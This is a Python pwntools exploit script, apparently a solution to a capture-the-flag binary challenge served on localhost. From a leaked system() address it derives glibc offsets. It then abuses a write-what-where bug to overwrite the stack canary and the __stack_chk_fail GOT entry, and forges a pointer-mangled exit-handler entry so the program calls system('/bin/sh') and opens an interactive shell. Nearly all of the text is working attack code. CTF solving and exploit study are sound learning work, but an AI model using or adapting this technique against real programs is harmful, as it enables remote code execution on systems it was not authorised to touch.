from pwn import *

chal = ELF('./vuln_patched')
libc = ELF('./libc.so.6')

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

# See
# - https://blog.zolutal.io/aslrnt/
conn = remote('localhost', 1337)

def main():
    conn.recvuntil(b' @ ')
    addr_system = int(conn.recvline().strip(), 0x10)
    addr_libc_base = addr_system - 0x5c110
    addr_tls = addr_libc_base - 0x28c0
    addr_got_stack_chk_fail = 0x404000

    """
    addr_libc_text = addr_libc_base + 0x5000
    pid = int(process(['pgrep', '-f', '-n', '/home/user/chal']).recvline().strip())
    gdbscript = f'''
    add-symbol-file ./libc.so.6 {hex(addr_libc_text)}
    '''
    gdb.attach(pid, exe=chal.path, gdbscript=gdbscript)
    """

    """
    addr_stack_guard = addr_tls + 0x28
    addr_one_gadget = addr_libc_base + 0xf72d2
    
    conn.sendlineafter(b'what? ', str(addr_one_gadget).encode())
    conn.sendlineafter(b'what? ', str(0).encode())
    conn.sendlineafter(b'where? ', hex(addr_stack_guard).encode())
    conn.sendlineafter(b'where? ', hex(addr_got_stack_chk_fail).encode())
    """

    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.c#L108-L121
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/cxa_atexit.c#L73-L74
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h#L34-L60
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L43-L46
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/x86_64/nptl/tcb-offsets.sym#L13
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/x86_64/nptl/tls.h#L36-L70
    addr_initial = addr_libc_base +  0x212000
    addr_cxa = addr_initial + 0x10 + 8
    addr_binsh = addr_libc_base + 0x1d84ab
    addr_stack_guard = addr_tls + 0x28
    addr_setbuf = addr_libc_base + 0x95960
    addr_main = 0x401196

    info(f'{addr_initial = :#x}')
    info(f'{addr_cxa = :#x}')
    info(f'{addr_system = :#x}')

    conn.sendlineafter(b'what? ', str(addr_main).encode())
    conn.sendlineafter(b'what? ', str(addr_setbuf).encode())
    conn.sendlineafter(b'where? ', hex(addr_stack_guard).encode())
    conn.sendlineafter(b'where? ', hex(addr_got_stack_chk_fail).encode())

    mangled = rol(addr_system ^ addr_setbuf, 17, 64)
    assert - (2**63) <= mangled <= 2**63 - 1
    conn.sendlineafter(b'what? ', str(mangled).encode()) # fn
    conn.sendlineafter(b'what? ', str(addr_binsh).encode()) # arg
    conn.sendlineafter(b'where? ', hex(addr_cxa).encode())
    conn.sendlineafter(b'where? ', hex(addr_cxa).encode())

    conn.interactive()

if __name__ == '__main__':
    main()
